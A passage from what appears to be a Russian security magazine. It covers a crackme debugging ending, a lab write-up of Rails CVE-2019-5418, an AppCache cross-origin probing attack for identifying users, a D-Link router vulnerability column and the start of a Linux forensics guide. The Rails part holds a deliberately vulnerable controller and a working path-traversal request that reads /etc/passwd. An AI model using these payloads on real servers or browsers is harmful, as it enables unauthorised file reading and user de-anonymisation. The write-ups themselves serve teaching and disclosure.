  00e127cb 0f1f440000   nop     dword ptr [eax+eax]
  00e127d0 668b10       mov     dx, word ptr [eax]
  00e127d3 663b11       cmp     dx, word ptr [ecx]
  00e127d6 751e         jne
  passCompare35!CpassCompare35Dlg::OnBnClickedOk+0x66 (00e127f6) [br=1]
  ...


Выделенная строка и код до нее крайне похожи на наш защитный механизм.
Проверим хранящиеся в регистрах зна чения:



  0:000> du eax
  01547af0  "myGOODpassword"
  0:000> du ecx
  012fe838  "KPNC Kaspersky++"


Введенная пользователем строка и эталонный пароль, как на блюдечке
с голубой каемоч кой! Одно лишь изменение типа данных может преобразить
процесс взлома.
  Замечательно! Вот так, безо вся ких лож ных срабатываний, элегантно,
быстро и красиво, мы победили защиту!
   Этот способ универ сален, и впоследс твии мы еще не раз им воспользуем‐
ся. Вся соль — определить ключевую функцию защиты и пос тавить на нее
бряк. В Windows все поползновения (обра щения к ключевому фай лу, реестру
и прочее) сводятся к вызову функций API, перечень которых хоть и велик,
но все же конечен и известен заранее.


        WWW

                    •Исходные коды к примерам в статье
ВЗЛОМ





            aLLy
           ONsec
           @iamsecurity



ФАЙЛЫ
ПО РЕЛЬСАМ

 КАК ЧИТАТЬ ЛЮБЫЕ ФАЙЛЫ
 С СЕРВЕРА ЧЕРЕЗ RUBY ON RAILS





Ты наверняка в курсе, что такое Ruby on Rails, если ког‐
да‐нибудь сталкивался с веб‐девом. Этот фреймворк в свое
время захватил умы разработчиков и успешно применяется
до сих пор. Любая уязвимость в нем означает огромное
количество потенциальных целей. В этот раз мы посмотрим,
как недавно найденный баг позволяет читать любые файлы
на целевой сис теме.


Уязвимость име ет номер CVE‐2019‐5418 и заключа ется в рас кры тии содер‐
жимого файла  в компоненте  ActionView. Специально сформированные
заголовки Accept при выполнении контрол леров, в которых имеются конс‐
трукции render  file:, могут привести к чтению произвольных файлов
на целевой системе. Уязвимы версии Ruby on Rails до 5.2.1.


СТЕНД
Демонстрацию уязвимости начина ем с констру ирования стенда. Возьмем
обычный контейнер Docker с Debian.


$ docker run ‐‐rm ‐p3000:3000 ‐ti ‐‐name=rails ‐‐hostname=rails
debian /bin/bash

Устанавливаем Ruby, Bundler и некоторые зависимости.


$ apt‐get ‐y update && apt‐get install ‐y ruby bundler libsql
ite3‐dev zlibc zlib1g zlib1g‐dev

Теперь установим фреймворк Rails уяз вимой версии, например 5.2.1.


$ gem install rails ‐v 5.2.1

Далее нужно создать папку для тес тового проекта, а в ней Gemﬁle — это спи‐
сок того, какие гемы и каких версий нуж ны разрабаты ваемому проекту.


$ mkdir ~/test && cd "$_"
$ echo "source 'https://rubygems.org'" >> Gemfile
$ echo "gem 'rails', '5.2.1'" >> Gemfile
$ echo "gem 'sqlite3', '~> 1.3.6', '< 1.4'" >> Gemfile

Теперь скачаем и установим все это дело.


$ bundle install

После этих манипуляций нужно создать приложение Rails из стандартного
шаблона.


$ rails new . ‐‐force ‐‐skip‐bundle

И снова установим необ ходимые гемы при помощи Bundle.


$ bundle install

Приложение готово, и можно запус тить веб‐сервер, чтобы проверить его
работу.


$ rails s





                  Проверка работы Ruby on Rails

Если все работает нормально, то создаем новый контроллер. Назовем его
vuln.


$ rails generate controller vuln

Фреймворк создаст необ ходимые файлы в директории с проектом. Откроем
сам код контрол лера app/controllers/vuln_controller.rb и добавим
в него уязвимый код.


app/controllers/vuln_controller.rb
class VulnController < ApplicationController
  def index
    render file: "#{Rails.root}/hello"
  end
end

В качестве представления (view) мож но указать путь до любого фай ла. Я соз‐
дал файл hello в кор не проекта с содержимым «Hi there!».
   Также нужно отредактировать файл с роута ми config/routes.rb и про‐
писать там имя нашего контроллера.


config/routes.rb
Rails.application.routes.draw do
  resources :vuln
end

Снова запустим веб‐сервер.





            Созданные контрол леры и запуск веб‐сервера

Если теперь ты перейдешь по URI /vuln, то увидишь строч ку Hi there!
из файла hello. Стенд готов.





           Готовый стенд для тес та уяз вимос ти в Ruby on Rails

Если тебя интересует отладка, то можешь восполь зоваться удаленной (c
некоторыми ограничениями). Я для этого возьму IDE RubyMine.
  При запуске Docker нужно открыть еще один порт для подключения
отладчика.


$ docker run ‐‐rm ‐p3000:3000 ‐p1234:1234 ‐ti ‐‐name=rails ‐‐hostname
=rails debian /bin/bash

Затем нужно установить на обо их машинах гемы для дебага. Следи, чтобы
они были одинаковых версий.


$ gem install ruby‐debug‐ide ‐v 0.7.0.beta7
$ gem install debase ‐v 0.2.3.beta5

Копируем проект на локальную машину, открываем его в RubyMine и добав‐
ляем конфигурацию удаленной отладки.





       Добавление конфигурации удален ной отладки в RubyMine

Указываем необходимые нас тройки. Обрати внимание на локальный и уда‐
ленный пути до проекта.





              Настрой ка удален ной отладки в RubyMine

В поле Server command находится команда, которую нужно выполнить на сер‐
вере, чтобы начать слушать порт и ждать подклю чения отладчи ка. Вмес то
$COMMAND$ указываем строку для запус ка сервера.


$ rdebug‐ide ‐‐host 0.0.0.0 ‐‐port 1234 ‐‐dispatcher‐port 26162 ‐‐
bin/rails s ‐b '0.0.0.0'

Теперь можно расставлять брейк‐пойнты и нас лаждаться отладкой.





       Удаленная отладка приложения на Rails с помощью RubyMine

Также никто не мешает отлаживать на этой же машине, вооб ще не используя
Docker.


ДЕТАЛИ
В этот раз начнем сразу с экс пло ита, так как он очень прост. Нужно отправить
запрос на уязвимый роут и указать в качес тве заголовка Accept конструкцию
c path traversal и {{ в конце.


GET /vuln HTTP/1.1
Host: rails.vh:3000
Connection: close
Accept: ../../../../../../../../../../etc/passwd{{

В ответ получишь содержимое файла /etc/passwd.





      Успешная эксплуата ция чтения локальных фай лов в Ruby on Rails

Теперь разберемся, что приводит к такому печаль ному поведению. Скачива‐
ем исходники этой версии Rails. Метод render может использовать в качес‐
тве представления файлы, которые находятся за пределами директории раз‐
рабатываемого  приложения.  Заглянем  в файл  template_renderer.rb.
При обработке опции file вызывается метод find_file, чтобы определить,
какой шаблон будет отоб ражен.


/actionview/lib/action_view/renderer/template_renderer.rb
05: module ActionView
06:   class TemplateRenderer < AbstractRenderer #:nodoc:
07:     def render(context, options)
08:       @view    = context
09:       @details = extract_details(options)
10:       template = determine_template(options)
...
22:       def determine_template(options)
...
25:         if options.key?(:body)
...
31:         elsif options.key?(:file)
32:           with_fallbacks { find_file(options[:file], nil, false,
keys, @details) }

Посмотрим в тело метода.


/actionview/lib/action_view/lookup_context.rb
008: module ActionView
...
016:   class LookupContext #:nodoc:
...
106:     module ViewPaths
107:       attr_reader :view_paths, :html_fallback_for_js
...
120:       def find_file(name, prefixes = [], partial = false, keys =
 [], options = {})
121:         @view_paths.find_file(*args_for_lookup(name, prefixes,
partial, keys, options))
122:       end




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 ФАЙЛЫ ПО РЕЛЬСАМ
               КАК ЧИТАТЬ ЛЮБЫЕ ФАЙЛЫ С СЕРВЕРА
                             ЧЕРЕЗ RUBY ON RAILS




Далее args_for_lookup генерирует опции, которые необходимы для рен‐
деринга вида.


/actionview/lib/action_view/lookup_context.rb
154:       def args_for_lookup(name, prefixes, partial, keys, detail
s_options)
155:         name, prefixes = normalize_name(name, prefixes)
156:         details, details_key = detail_args_for(details_options)
157:         [name, prefixes, partial || false, details, details_key,
 keys]
158:       end

После выполнения это го кус ка кода данные из заголовка Accept оказываются
в переменной details[format].





  Метод args_for_lookup помещает данные из заголовка Accept в массив
   details[format]

Затем вызывается @view_paths.find_file.


/actionview/lib/action_view/path_set.rb
03: module ActionView #:nodoc:
...
11:   class PathSet #:nodoc:
...
51:     def find_file(path, prefixes = [], *args)
52:       _find_all(path, prefixes, args, true).first || raise(Missin
gTemplate.new(self, path, prefixes, *args))
53:     end
...
74:       def _find_all(path, prefixes, args, outside_app)
75:         prefixes = [prefixes] if String === prefixes
76:         prefixes.each do |prefix|
77:           paths.each do |resolver|
78:             if outside_app
79:               templates = resolver.find_all_anywhere(path, prefix
, *args)
...
82:             end
83:             return templates unless templates.empty?
84:           end
85:         end
86:         []
87:       end

Файл находится за пределами директории приложения  (app), поэтому
переменная outside_app уста новлена в значение True и будет вызван метод
find_all_anywhere.





                Отладка метода ﬁnd_all из ActionView


/actionview/lib/action_view/template/resolver.rb
010: module ActionView
011:   # = Action View Resolver
012:   class Resolver
013:     # Keeps all information about view path and builds virtual
path.
014:     class Path
...
151:     def find_all_anywhere(name, prefix, partial = false, details
 = {}, key = nil, locals = [])
152:       cached(key, [name, prefix, partial], details, locals) do
153:         find_templates(name, prefix, partial, details, true)
154:       end
155:     end

Далее вызов find_templates начинает процесс генерации пути до файла
представ ления.


/actionview/lib/action_view/template/resolver.rb
207:   class PathResolver < Resolver #:nodoc:
208:     EXTENSIONS = { locale: ".", formats: ".", variants: "+",
handlers: "." }
209:     DEFAULT_PATTERN = ":prefix/:action{.:locale,}{.:formats,}{+:
variants,}{.:handlers,}"
210:
211:     def initialize(pattern = nil)
212:       @pattern = pattern || DEFAULT_PATTERN
213:       super()
214:     end
...
218:       def find_templates(name, prefix, partial, details, outsid
e_app_allowed = false)
219:         path = Path.build(name, prefix, partial)
220:         query(path, details, details[:formats], outside_app_all
owed)
221:       end





      Начало генерации шаблона для поиска файла пред ставления

Обрати внимание на дефолтный паттерн (стро ка 209).


:prefix/:action{.:locale,}{.:formats,}{+:variants,}{.:handlers,}

Если ты легитимно обращаешь ся к /vuln, то готовый паттерн будет выглядеть
примерно так:


hello{.{en}.}{.{.},}{+{},}{.{raw,erb,html,builder,ruby,coffee,
jbuilder},}

В процессе вызывается метод query, в качес тве аргументов отправляется
наша переменная details[:formats].


223:       def query(path, details, formats, outside_app_allowed)
224:         query = build_query(path, details)
225:
226:         template_paths = find_template_paths(query)
...
239:         end
240:       end

Здесь в build_query формиру ется шаб лон поиска пути, из которого будет
подгружен файл представления.





        Метод build_query завершает формирование шаблона


/actionview/lib/action_view/template/resolver.rb
261:       def build_query(path, details)
262:         query = @pattern.dup
263:
264:         prefix = path.prefix.empty? ? "" : "#{escape_entry(path.
prefix)}\\1"
265:         query.gsub!(/:prefix(\/)?/, prefix)
266:
267:         partial = escape_entry(path.partial? ? "_#{path.name}" :
 path.name)
268:         query.gsub!(/:action/, partial)
269:
270:         details.each do |ext, candidates|
271:           if ext == :variants && candidates == :any
272:             query.gsub!(/:#{ext}/, "*")
273:           else
274:             query.gsub!(/:#{ext}/, "{#{candidates.compact.uniq.
join(',')}}")
275:           end
276:         end
277:
278:         File.expand_path(query, @path)
279:       end

Благодаря тому что переменная details[formats] никак не фильтруется,
атакующий имеет возможность внедрять произвольную строку в формат
поиска файла представления. Используя конструкции ../, мы осуществляем
выход из директории и добира емся до пути /etc/passwd, а две фигурные
скобки в конце строки добавляем для того, чтобы конс трукция получилась
валидная. Таким образом мы как бы рас ширяем дефол тный паттерн. В итоге,
после того как отработа ет File.expand_path, строка для поиска файла
представ ления будет иметь вид


/root/testapp/app/views/root/testapp/hello{.
en,}{.../../../../../../../../../../etc/passwd{{,}{}{.raw,.erb,.html,
.builder,.ruby,.coffee,.jbuilder,}

Дальше методы render_template и render_with_layout делают свое дело
и загружают содержимое файла passwd во время рендеринга.


/actionview/lib/action_view/renderer/template_renderer.rb
49:       def render_template(template, layout_name = nil, locals =
nil)
50:         view, locals = @view, locals || {}
51:
52:         render_with_layout(layout_name, locals) do |layout|





  Отладка метода render_template. Файл /etc/passwd используется
  в качестве шаблона


/actionview/lib/action_view/renderer/template_renderer.rb
59:       def render_with_layout(path, locals)
60:         layout  = path && find_layout(path, locals.keys, [formats
.first])
61:         content = yield(layout)
62:
63:         if layout
64:           view = @view
65:           view.view_flow.set(:layout, content)
66:           layout.render(view, locals) { |*name| view._layout_for(
*name) }
67:         else
68:           content
69:         end
70:       end





    Вывод содер жимого файла /etc/passwd в качестве представления

Эксплуатация успешно завершена.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
Вот такая банальная и одновременно опасная уязвимость. Советую про‐
верить свои проекты на наличие конс трукций вида render file:, и, если они
имеются, надо менять логику.
  И советую обновить Rails до последних версий, если приложение это поз‐
воляет. Разработчики быс тро отреаги рова ли и выпустили патч для устра‐
нения этой уязвимости, версии 5.2.1 и старше ее лишены.
ВЗЛОМ




  ПОДВОДНЫЕ
    КАМНИ
   APPCACHE

     КАК ЗЛОДЕИ ИДЕНТИФИЦИРУЮТ
       СТАТУС КРОСС‐ДОМЕННЫХ
            РЕСУРСОВ





Механизм AppCache позволяет веб‐при‐
ложениям кешировать ресурсы в локаль‐
ном хранилище твоего бра узера. Это дает
им    возможность    взаимодействовать
с  тобой  даже  в  авто номном  режиме.         Владимир Карев                                                                                Инженер с 50‐летним
Но  когда  через  AppCache  кешируются        стажем.SpectrumСвой первыйспаял  ZX
кросс‐доменные ресурсы, возникает серь‐           vladimir.tech@mail.ruсамостоятельно
езный  риск  утечки  конфиденциальной
информации. Давай разберемся, как это
происходит.


ЧТО ТАКОЕ CORSIDA?
Аббревиатура CORSIDA придумана мной и рас шифровывается как Cross‐Ori‐
gin Resource Status Identiﬁcation Attack. Суть CORSIDA заключается в иден‐
тификации статуса кросс‐доменных ресурсов пос редством злоупотребления
манифестом AppCache: URL существу ет, редирект, ошибка.





                  Пример манифес та AppCache

CORSIDA схожа с CSRF. Выполняя CORSIDA, злодей стремится заполучить
твою конфиденциальную информацию, кос венно хранящу юся в браузере.
Для этого ему нужно, что бы ты посетил его сайт, страницы которого слегка
вредоносны. И когда я говорю «слегка», я имею в виду, что они практически
безобидны. На них нет и намека на экс пло иты, которые могли бы помочь зло‐
умышленнику заполу чить контроль над тво им бра узе ром. Но эти слегка
зараженные страницы содержат вполне допус тимые теги HTML и скрипты
для инклудинга кросс‐доменного контента. Идентифицировать злонамерен‐
ное поведение такого вредонос ного сай та воз можно, но очень сложно.


             INFO

                       Атака CORSIDA построена на злоупотреблении
                      механизмом CORS, который современные бра‐
                        узеры используют,  что бы  дать  веб‐стра ницам
                       возможность получать доступ к ресурсам другого
                       домена.



ЧЕМ ОПАСНА CORSIDA
Злодей может использовать базовую вер сию CORSIDA, чтобы определить,
сохранен ли в твоем бра узере логин и пароль веб‐при ложе ния. Часто, когда
ты заходишь на свою личную стра ницу, то или иное приложение делает
условный редирект: если в бра узере нет логина и пароля, то происходит
редирект на страницу залогинивания, а если есть, то не происходит.
   Вот несколько популярных сайтов, которые работа ют по такому принципу.


 Лич ная страница              Условный редирект

  https://www.amazon.com/gp/wallet?
                                            https://www.amazon.com/ap/signin?...
  ie=UTF8&ref_=ya_wallet

  http://my.ebay.com/ws/eBayISAPI.dll?       https://signin.ebay.com/ws/eBayIS‐
 MyeBay                                         API.dll?SignIn...

                                             https://instagram.com/accounts/login/?
  https://instagram.com/accounts/edit/
                                             next=/accounts/edit/

  https://sourceforge.net/projects/ﬁlezilla/r    https://sourceforge.net/account/lo‐
  eviews/new                                  gin.php?return_to=...

                                             https://www.tmblr.com/login?
  http://www.tumblr.com/dashboard
                                            redirect_to=/dashboard

                                            http://wordpress.com/wp‐login.php?
  http://wordpress.com/post/
                                                   redirect_to=...

                                             https://www.yelp.com/login?
  https://www.yelp.com/proﬁle_bio
                                              retun_url=/proﬁle_bio

  http://www.youtube.com/feed/subscrip‐     https://accounts.google.com/ServiceLo‐
  tions                                              gin?...

Если в браузере есть логин и пароль для конкретного веб‐приложения, то
процедура кеширования соот ветс твующего URL про ходит успешно, потому
что редирект не выполняется. Если же логина и пароля нет, то процедура
кеширования завершается неудачей. Поэто му, наб людая за тем, где про‐
цедура AppCache оканчивается успехом, а где неудачей, злодей может
узнать, для каких веб‐приложений в твоем бра узере логин и пароль сох‐
ранены, а для каких нет. Благодаря это му он может выяснить, есть ли у тебя
доступ к приват ным страницам конкретных компаний, университетов, соци‐
альных сообществ.
  Кроме того, зондируя адреса URL вроде тех, что представлены ниже, пос‐
торонний человек может установить твою личность — если твой идентифика‐
тор присутствует в его списке.
 • https://bitbucket.org/account/user/<userid>
 • https://github.com/<userid>//settings
 • http://stackovertlow.com/users/edit/<userid>
 • http://twitpic.com/media/edit/Location/<photoid>
 • http://<blogid>.wordpress.com/wp‐admin
 • https://ndss2015.ccs.neu.edu/paper/<paperno>

Злодей может определить сферы твоих предпочтений, наблюдая за тем,
на кого ты подписан в социальных сетях и в каких группах ты состоишь. Рас‐
смотрим напоследок такие популярные плат формы, как Tumblr и Flickr.
   Когда твой браузер, находясь под CORSIDA, посещает http://www.tum‐
blr.com/follow/<blog‐id>, злодей узнает, подписан ли ты на блог с иден‐
тификатором <blog‐id>. Каким образом? Отслеживая факт редиректа. Если
ты подписан на этот блог, твой браузер сделает редирект на http://www.
tumbler.com/unfollow/<blog‐id> и, соответс твенно, процесс AppCache
завершится неудачей.
   Аналогично можно узнать, в каких группах ты сос тоишь на Flickr. Если ты
пройдешь по URL http://www.flickr.com/groups_leave.gne?id=<group‐
id>, злодей узнает, являешь ся ли ты членом груп пы с идентификатором
group‐id. Если нет, твой бра узер сделает редирект на http://www.fiickr.
com/groups/<group‐id>, а если да, то редирект не произойдет.


Уникальные осо бен ности
 1. CORSIDA  может  извлекать  твою  конфиденциальную  информацию
   без использования вредонос ных скриптов, пла гинов и CSS. Атака реали‐
   зуется при помощи прос тейшего документа HTML, в манифесте AppCache
   которого указывается зондиру емый URL. CORSIDA успешно преодолевает
   традиционные средства безопасности, вроде NoScript, поскольку отклю‐
   чение подозрительных скриптов и плагинов ей не препятс твует.
 2. CORSIDA может одновременно идентифицировать статус сразу несколь‐
   ких адресов URL. Это для злоумышленника очень важно. Потому что он
   всегда стре мится выведать твои секреты как можно быс трее, пос кольку
   знает, что ты, скорее всего, не задержишься на его странице надол го.
   Традиционные атаки подобного рода основаны на таймингах, поэтому
   не могут одновременно зондировать сразу несколько URL. Параллельные
   запросы HTTP и HTTPS приводят к ошиб кам синхронизации. CORSIDA
  функционирует, не полага ясь на тай минг, и поэтому может парал лельно
   зондировать сразу несколько URL.
 3. Также эта атака может отслеживать редиректы. Традиционные атаки
   подобного рода, основанные на таймингах, такой возможности не имеют,
   поскольку для зондирова ния статуса URL опираются на теги вроде img,
  script и link, которые совершают редирект прозрачно для пользовате‐
   ля.


        WWW

                    Почитать подробнее о таймингах мож но тут, тут
                      и тут.



МОДИФИКАЦИИ БАЗОВОЙ АТАКИ
Атака с использованием скрипта
Если, обрабатывая список адресов URL, перечис ленных в манифесте App‐
Cache, твой браузер встречает хотя бы один некеши руемый, он генерирует
событие error. Так зло умышленник узна ет, есть ли среди этих URL хотя бы
один некешируемый: если скрипт дождался этого события — как минимум
один такой URL есть.





              Скрипт для зондирова ния кеширу емости URL


             INFO

                   В AppCache не кешируются три типа URL: недей‐
                        ствительные, динамические и с редиректами.



Атака без использования скрипта
 1. Когда ты заходишь через браузер на вредонос ную страницу, которая зло‐
  намерилась  провести  против  тебя  CORSIDA,  страница  фиксирует
  информацию о твоем браузере.
 2. Твой браузер скачивает манифест AppCache и извле кает из него URL.
 3. Далее твой браузер пытается получить дос туп к этому URL.
 4. Если обращение к это му URL увенчалось успехом, твой браузер повторно
   скачивает манифест, чтобы про верить, не было ли изменений.





         Последовательность шагов для действи тельного URL

Если же твоему браузеру не уда ется про кеши ровать указанный в манифесте
URL, он обрывает выполнение процеду ры AppCache и не перезагружает
манифест.





         Последовательность шагов для недействительного URL

На основе различий на этом четвертом шаге злодей делает вывод, может ли
твой браузер кешировать URL, ука занный в манифесте.


Парал лельная атака по нескольким URL
Поскольку CORSIDA не зависит от таймингов, как традиционные атаки подоб‐
ного рода, злоумышленник может одновременно зондировать сразу несколь‐
ко URL, используя для этого несколько веб‐стра ниц и манифестов AppCache,
находящихся в несколь ких тегах iframe.





              Параллельная ата ка по нескольким URL

Главная страница атаки attack_all.php содержит несколько скрытых тегов
iframe,   каждый   из   которых   ука зывает   на   страницу   субатаки
attack_each.php. Обрати внимание, целевые адреса URL здесь передаются
через GET.





                                  attack_all.php





                             attack_each.php

Каждая страница субатаки объявляет свой собственный манифест — mani‐
fest.php.





                                manifest.php

Наконец, каждый из этих манифестов ука зывает в разделе CACHE тот самый
URL, который надо зондировать.
  Скорость атаки зависит от браузера. В Chrome, Internet Explorer и Opera
она выполняется довольно резво, поскольку в них манифес ты AppCache
обрабатываются параллельно. Тогда как Firefox обрабаты вает манифесты
последовательно. Например, на ПК средней конфигурации параллельная
атака на двести страниц занимает в браузерах Chrome и Opera 0,11 секунды,
в Internet Explorer — 0,27 секунды, в Firefox — 0,95 секунды.


ИТОГИ
Теперь ты знаешь, как при помощи AppCache злоумышленник может извле‐
кать твою конфиденциаль ную информацию, кос венно хранящуюся в браузе‐
ре. Лишить его такой возможности очень неп росто. Раду ет только то, что
механизм AppCache постепенно утрачивает свою популярность.
ВЗЛОМ


  НОВЫЕ УЯЗВИМОСТИ
В ПОПУЛЯРНОМ РОУТЕРЕ
        D-LINK

     КОЛОНКА ДЕНИСА МАКРУШИНА





Говорят, если у тебя в руках молоток, то все
вокруг  похоже  на  гвоздь. Инструменты
для  анализа  защищенности  про шивок
в этом плане ничем не  хуже молотка.
Однажды мне  достался  от  про вайдера         Денис Макрушин                                                                                      Специализируется на
роутер D‐Link DIR‐620, который я начал изу‐         разработкеисследованиитехнологийугроз и
чать  ради  интереса. И чем  дальше  я       защиты#InspiredByInsecureот целевых атак.
углублялся в это, тем страшнее мне ста‐          condifesa@gmail.com
новилось за тех, кто пользуется таким обо‐
рудованием  и  не  задумывается  о  его
безопасности.


В прошлом году я обна ружил серию уязвимостей в DIR‐620 RevG и отправил
производителю репорт — информацию ты можешь найти в моем блоге.
Некоторые из дыр прошивки — критичес кие, например зашитые в нее админ‐
ские учетки для веб‐панели и  Telnet. Эти уязвимости теперь известны
как CVE‐2018‐6213 и CVE‐2018‐6210.
  Но я решил не останавливать ся на достигну том и посмотреть, что еще мне
подкинул провайдер вместе с роутером. В результате удалось обнаружить
пару новых багов — не менее критичных, чем предыдущие. Постараюсь рас‐
сказать не только о самих уяз вимостях, но и о том, как я их искал, чтобы ты
мог повторить то же с другой моделью роутера. И конечно, моя цель —
не только найти слабое место роутера, но и помочь производителям железа
сделать свои продукты безопаснее.


           WARNING

                     Сведения об описан ных в материале уязвимостях
                     были своевременно предоставлены всем ответс‐
                        твенным лицам. Мы публикуем эту информацию
                        в соответствии с общепринятой политикой раз‐
                         глашения уязвимостей. Однако в связи с тем, что
                       большое количество устройств находят ся в зоне
                      риска, мы не будем раскрывать полную информа‐
                   цию  и  найденные  учетные  записи.  Данный
                      материал пуб ликуется исключительно  в обра‐
                       зовательных целях и для того, что бы обезопа сить
                       пользовате лей уязвимых устройств.



НАЧИНАЕМ ИССЛЕДОВАНИЕ
Поскольку D‐Link DIR‐620 достался мне совершенно случайно, на его месте
могла быть любая другая модель, а найденные уяз вимос ти характерны и для
других классов устрой ств — систем DVR, видеорегис траторов и прочих гад‐
жетов. Кстати, проб лемы с DVR мы раз бирали в предыдущей статье.
  Прежде чем начинать исследова ние, стоит заранее оценить масштабы
потенциальных проб лем и заглянуть в поисковые сис темы. К примеру, можно
увидеть, что география рас простра нения устрой ства сконцентрирована пре‐
имущественно в России и стра нах СНГ.





              Объект исследова ния — D‐Link DIR‐620

Чтобы найти устрой ства с нужной версией про шивки, стоит использовать
как можно более точные фингерприн ты софта — баннеры и версии сервисов,
уникальные стро ковые комбинации в веб‐панелях управления и подобное.
Другими словами, любые уникальные характерис тики и их совокупность,
которые укажут поисковику на нужный софт среди тонны похожих прошивок.
   Уязвимости и зашитые учетные записи объекта моего исследования были
обнаружены в прошивке версии 1.0.37. В нас тоящее время существует более
свежая прошивка 2.0.22, в которой эти баги отсутствуют. Однако при некор‐
ректном обновлении со ста рой версии прошивки на последнюю некоторые
из проблем останутся.


РАСКРЫТИЕ ЧУВСТВИТЕЛЬНОЙ ИНФОРМАЦИИ
В КОНФИГУРАЦИОННОМ ФАЙЛЕ
CVE: CVE‐2018‐12677
CVSS Base Score: 7.5
Век тор: (AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H)
   Этот недостаток конфигура ции — отличный пример того, как связка
из несущественных косяков может привести к уяз вимости. Если использовать
уязвимость внедрения кода (OS command injection, CVE‐2018‐6211) из пре‐
дыдущего материала, то у атакующего появляется возможность читать фай‐
лы. А это открывает возможность изучить внутреннос ти запущенной прошив‐
ки. Как ты понимаешь, про шивка интересна тем, что содержит в себе все вре‐
менные файлы и временную информацию, которую ты не найдешь в статике.
   Как оказалось, в процессе работы создается конфигурационный файл
tmp/config.json, который содержит все учетные данные пользователя
в открытом виде. Беглый осмотр этого фай ла показывает, что там складыва‐
ются буквально все нас тройки, которые затем подтягиваются различными
сервисами прошивки. Поэто му при получении доступа к запущенной прошив‐
ке в первую очередь ищи все временные файлы и директории.
   Баг не очень‐то серьезный, если учесть, что атакующий дол жен иметь пра‐
ва привилегированного пользователя. Одна ко эта воз можность хорошо
помогает в эксплуатации следующей уяз вимос ти.


РАСКРЫТИЕ ЧУВСТВИТЕЛЬНОЙ ИНФОРМАЦИИ ДЛЯ
НЕПРИВИЛЕГИРОВАННОГО ПОЛЬЗОВАТЕЛЯ
CVE: CVE‐2018‐12419
CVSS Base Score: 7.5
Век тор: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
   Вторую уязвимость я нашел совершенно случайно: открыл веб‐страницу
аутентификации, посмотрел ее исходный код и увидел избыточную информа‐
цию со строками, напоминающими пароли. Вся эта информация напомнила
формат представ ления конфигурационного фай ла, который я нашел ранее
во временной директории.
   Как оказалось, уязвимость CVE‐2018‐12677 рас крывает все пароли поль‐
зователей прошивки в конфигура ционном файле, та, на которую я наткнул ся,
подтягивает часть этого файла в переменную JavaScript. И это дает воз‐
можность  неавторизованному  пользователю  просматривать  фрагмент
содержимого файла без дос тупа в админку. При этом фрагмент содержит
чувствительную  к разглашению информацию: пароли в открытом виде
и параметры конфигура ции.





  Фрагмент переменной, которая находится на главной веб‐странице
  админской панели роутера


«ЗАШИТЫЕ» УЧЕТНЫЕ ДАННЫЕ ДЛЯ ВЕБ-ПАНЕЛИ УПРАВЛЕНИЯ
CVE: CVE‐2018‐12676
CVSS Base Score: 10.0
Век тор: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
  И снова вернемся к первой уяз вимости, которая раскрывает конфигура‐
ционный файл. После его непродолжительного ана лиза можно найти стран‐
ную учетную запись, которую пользователь точно не создавал. Проще всего
пробежаться по распакованной прошивке (или по ее дампу) каким‐нибудь
парсером. Например, Firmwalker позволя ет проверить содержимое дампа
на наличие интересной информации: строк с пароля ми, сертификатов, кон‐
фигурационных файлов и про чего. Одна ко в моем случае никаких тулз
не понадобилось — все учетки береж но складывались в тот же вре менный
файл с конфигом.
  Среди списка учеток пря чется запись с именем пользователя, которое
начинается со слова support. Как выяснилось позже, этот аккаунт пред‐
назначен для нужд службы поддержки про вай дера. Используя эту учетную
запись, атакующий может получить админис тративный доступ  к панели
управления роутером.





          Странная учет ная запись в конфигурационном фай ле


КАК СЕБЯ ОБЕЗОПАСИТЬ
Чтобы исправить описанные уяз вимости, владель цу DIR‐620 необходимо
обновить прошивку до последней версии, на момент написания этой статьи
доступна версия 2.0.22. При этом стоит иметь в виду, что после миграции
с  уязвимой версии про шивки на пос леднюю  конфигурационный файл
с зашитым аккаунтом тоже мигриру ет в новую прошивку. Именно поэтому я
рекомендую выпол нить следующие шаги:
 • обновить прошив ку до пос ледней версии (2.0.22);
 • сбросить настрой ки роутера до заводских;
 • запретить любой доступ к веб‐панели управления, используя белый спи‐
   сок IP‐адре сов;
 • запретить любой доступ по протоко лу Telnet;
 • регулярно менять пароли для учетных записей.
ПРИВАТНОСТЬ
  ФОРЕНЗИКА
   В LINUX

      ДАМПИМ ПАМЯТЬ, ДИСКИ
       И СЕТЕВЫЕ КОННЕКТЫ
    ДЛЯ ДАЛЬНЕЙШЕГО ПОИСКА УЛИК





                                       Иван Пискунов





Первая задача в цифровой криминалис тике — это сбор информации, кон‐
кретно — получение обра зов жес тких дисков и оперативной памяти, а также,
если это может помочь, дампов сетевых соединений. В этой статье мы пос‐
мотрим, что нужно сделать для получения всего этого на машинах с Linux,
а заодно научим ся и дру гим полезным навыкам.


Это новая часть цикла по форензике для новичков, в котором мы рассказыва‐
ем о том, что такое цифровая форензика, разбира ем наиболее популярные
инструменты анализа, изу чаем несколько кей сов на устрой ствах с Android
и расследуем хищение денежных средств из системы ДБО на ноутбуке с Win‐
dows 10.
  Предыдущие статьи цикла:
 1. «Теория, книги, курсы, полезные матери алы»
 2. «Находим источники дан ных, ищем и ана лизи руем арте факты»
 3. «Android под кол паком. Как рас крывают кейсы взло ма»
 4. «Тайна казначейского ноутбука. Используем форензику, чтобы рас крыть
   ограбление»



Есть много вариантов соз дания дампа содержимого жесткого диска или опе‐
ративной памяти. При этом можно использовать и нативные утилиты, вхо‐
дящие в состав дистрибутива, и сторонние программы — как со свободной
лицензией, так и коммерческие. Я по воз можнос ти сосредоточусь на наибо‐
лее известных, максимально прос тых и рабочих инструментах.
  Первым делом на «живые» системы я рекомендую  ставить  утилиту
Auditd — с ее помощью можно получить детальные све дения об изменени ях
системы в режиме ауди та.
  Прежде всего нас будут интересовать такие события, как:
 • запуск и завершение работы системы (перезаг рузка, остановка);
 • чтение/запись системных файлов и изменение прав доступа к ним;
 • инициация сетевого соединения и изменение сетевых нас троек;
 • изменение информации о пользователе или группе;
 • изменение даты и времени;
 • установка, удаление, запуск и остановка прог рамм и демонов;
 • выполнение системных вызовов.

Также рекомендую настроить системный syslog.conf и скорректировать
правила сбора сооб щений: увеличить глу бину собираемых алертов (уро‐
вень 7) и пул источников (диапазон от 0 до 15). Это все позволит наблюдать
